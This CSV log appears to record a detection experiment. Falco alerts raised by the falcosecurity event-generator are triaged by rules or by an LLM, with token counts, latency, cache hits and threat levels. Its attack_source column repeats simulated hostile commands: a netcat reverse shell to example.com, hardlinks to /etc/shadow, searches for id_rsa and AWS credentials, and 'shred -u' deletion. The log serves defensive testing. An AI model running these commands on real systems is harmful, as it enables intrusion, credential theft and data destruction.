timestamp,event_type,rule_name,priority,prompt_tokens,completion_tokens,latency_ms,remediation_status,remediation_action,mitre_technique,target_container,attack_source,attack_label,attack_id,container_id,container_image,event_source,experiment_mode,ground_truth,rule_matched,llm_called,cache_hit,cache_key,gate_decision,llm_action,llm_threat_level,cache_ttl
2026-05-17T12:21:00.051090,llm-analyzed,System user interactive,Informational,314,55,7228,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,256d745947e9b7d7eae333d0ebd169e3,llm,pause,medium,30
2026-05-17T12:21:01.633357,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:21:11.074929,llm-analyzed,Packet socket created in container,Notice,363,53,7862,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,50444a11263ba4bdc942b447dce33e70,llm,alert,high,30
2026-05-17T12:21:12.655644,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:21:14.236911,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:21:24.150846,llm-analyzed,Fileless execution via memfd_create,Critical,376,57,8333,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ed1d903fc003a9a58bc1a53dc4c8ee7d,llm,alert,high,30
2026-05-17T12:21:35.269028,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,421,67,9536,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3659591051/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ce29cc75814d17294a676363d10f7622,llm,alert,high,30
2026-05-17T12:21:43.897425,llm-analyzed,System user interactive,Informational,314,51,7048,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,256d745947e9b7d7eae333d0ebd169e3,llm,stop,high,30
2026-05-17T12:21:45.481497,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:21:55.822756,llm-analyzed,PTRACE anti-debug attempt,Notice,331,82,8762,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,1e39dfc23dcf83ae7a47a9666599847c,llm,pause,high,30
2026-05-17T12:21:57.413766,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:22:06.949329,llm-analyzed,Search Private Keys or Passwords,Warning,342,62,7956,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,3a08e749a190242c74492afdfc1de468,llm,alert,medium,30
2026-05-17T12:22:16.515089,llm-analyzed,Directory traversal monitored file read,Warning,350,62,7982,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6b25374d77be2bccc3489c6473bdb223,llm,pause,medium,30
2026-05-17T12:22:26.608104,llm-analyzed,Read sensitive file trusted after startup,Warning,381,58,8510,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b7d41082564995db77d6b74b75a4f3d2,llm,alert,high,30
2026-05-17T12:22:36.707622,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,383,61,8517,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,629494c6c6d948ac631c427d8d609862,llm,alert,medium,30
2026-05-17T12:22:46.986523,llm-analyzed,Find AWS Credentials,Warning,367,70,8696,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b95c830e335267463f9a43857f2ed885,llm,pause,medium,30
2026-05-17T12:22:56.664704,llm-analyzed,Remove Bulk Data from Disk,Warning,385,49,8098,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3977651963,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6c972ecf189eefa9be9e4d28f665b944,llm,pause,medium,30
2026-05-17T12:23:07.874105,llm-analyzed,Execution from /dev/shm,Warning,408,74,9630,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-D0PiMF.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,4e4f7083604fc1fe55707f472ebe6270,llm,pause,medium,30
2026-05-17T12:23:09.452540,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-D0PiMF.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,pause,medium,30
2026-05-17T12:23:20.416229,llm-analyzed,Clear Log Activities,Warning,342,94,9371,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,357658d27e05316e491368365302d386,llm,pause,medium,30
2026-05-17T12:23:30.422587,llm-analyzed,Create Symlink Over Sensitive Files,Warning,414,49,8426,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-4097235232/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,aa21b1177c801979bea62a239e056977,llm,alert,medium,30
2026-05-17T12:23:32.002370,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:23:43.607911,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,421,72,10025,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3611764846/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ce29cc75814d17294a676363d10f7622,llm,alert,high,30
2026-05-17T12:23:52.254182,llm-analyzed,System user interactive,Informational,314,57,7065,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,256d745947e9b7d7eae333d0ebd169e3,llm,alert,high,30
2026-05-17T12:23:53.833371,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:24:03.841615,llm-analyzed,PTRACE anti-debug attempt,Notice,331,76,8424,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,1e39dfc23dcf83ae7a47a9666599847c,llm,alert,high,30
2026-05-17T12:24:05.423289,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:24:15.340085,llm-analyzed,Search Private Keys or Passwords,Warning,342,72,8337,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,3a08e749a190242c74492afdfc1de468,llm,alert,medium,30
2026-05-17T12:24:25.382818,llm-analyzed,Directory traversal monitored file read,Warning,350,73,8462,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6b25374d77be2bccc3489c6473bdb223,llm,pause,medium,30
2026-05-17T12:24:35.203306,llm-analyzed,Read sensitive file trusted after startup,Warning,381,56,8228,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b7d41082564995db77d6b74b75a4f3d2,llm,pause,medium,30
2026-05-17T12:24:46.721886,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,384,92,9937,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,629494c6c6d948ac631c427d8d609862,llm,alert,medium,30
2026-05-17T12:24:56.954539,llm-analyzed,Find AWS Credentials,Warning,367,68,8651,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b95c830e335267463f9a43857f2ed885,llm,alert,high,30
2026-05-17T12:25:08.790181,llm-analyzed,Remove Bulk Data from Disk,Warning,385,98,10251,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3880705581,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6c972ecf189eefa9be9e4d28f665b944,llm,pause,medium,30
2026-05-17T12:25:20.364820,llm-analyzed,Execution from /dev/shm,Warning,412,81,9995,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-1qET8z.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,4e4f7083604fc1fe55707f472ebe6270,llm,alert,high,30
2026-05-17T12:25:21.943838,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-1qET8z.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,30
2026-05-17T12:25:31.026639,llm-analyzed,Clear Log Activities,Warning,343,56,7501,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,357658d27e05316e491368365302d386,llm,pause,medium,30
2026-05-17T12:25:41.218665,llm-analyzed,Create Symlink Over Sensitive Files,Warning,414,53,8612,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-3368901967/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,aa21b1177c801979bea62a239e056977,llm,alert,medium,30
2026-05-17T12:25:42.798087,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:25:52.344285,llm-analyzed,Packet socket created in container,Notice,363,57,7955,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,50444a11263ba4bdc942b447dce33e70,llm,alert,high,30
2026-05-17T12:25:53.925873,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:25:55.506876,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:26:05.093816,llm-analyzed,Fileless execution via memfd_create,Critical,376,52,8008,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ed1d903fc003a9a58bc1a53dc4c8ee7d,llm,pause,high,30
2026-05-17T12:26:06.672942,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:26:16.655999,llm-analyzed,Search Private Keys or Passwords,Warning,342,74,8405,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,3a08e749a190242c74492afdfc1de468,llm,alert,medium,30
2026-05-17T12:26:26.354941,llm-analyzed,Directory traversal monitored file read,Warning,350,66,8119,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6b25374d77be2bccc3489c6473bdb223,llm,alert,medium,30
2026-05-17T12:26:35.749284,llm-analyzed,Read sensitive file trusted after startup,Warning,381,48,7814,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b7d41082564995db77d6b74b75a4f3d2,llm,alert,high,30
2026-05-17T12:26:45.193094,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,384,49,7865,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,629494c6c6d948ac631c427d8d609862,llm,alert,high,30
2026-05-17T12:26:56.281841,llm-analyzed,Find AWS Credentials,Warning,367,86,9508,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b95c830e335267463f9a43857f2ed885,llm,alert,medium,30
2026-05-17T12:27:06.090634,llm-analyzed,Remove Bulk Data from Disk,Warning,385,55,8215,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-1986643590,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6c972ecf189eefa9be9e4d28f665b944,llm,pause,medium,30
2026-05-17T12:27:16.371210,llm-analyzed,Execution from /dev/shm,Warning,412,56,8700,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-x5wTtX.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,4e4f7083604fc1fe55707f472ebe6270,llm,pause,medium,30
2026-05-17T12:27:17.951472,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-x5wTtX.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,pause,medium,30
2026-05-17T12:27:28.231313,llm-analyzed,Clear Log Activities,Warning,343,80,8701,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,357658d27e05316e491368365302d386,llm,alert,high,30
2026-05-17T12:27:39.115500,llm-analyzed,Create Symlink Over Sensitive Files,Warning,414,67,9302,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1669706002/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,aa21b1177c801979bea62a239e056977,llm,alert,high,30
2026-05-17T12:27:40.695259,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:27:51.081586,llm-analyzed,Packet socket created in container,Notice,363,61,8806,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,50444a11263ba4bdc942b447dce33e70,llm,pause,medium,30
2026-05-17T12:27:52.663515,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:27:54.243772,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,30
2026-05-17T12:28:03.646618,llm-analyzed,Fileless execution via memfd_create,Critical,376,48,7809,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ed1d903fc003a9a58bc1a53dc4c8ee7d,llm,alert,medium,30
2026-05-17T12:28:15.106856,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,415,77,9880,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-92734879/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ce29cc75814d17294a676363d10f7622,llm,alert,high,30
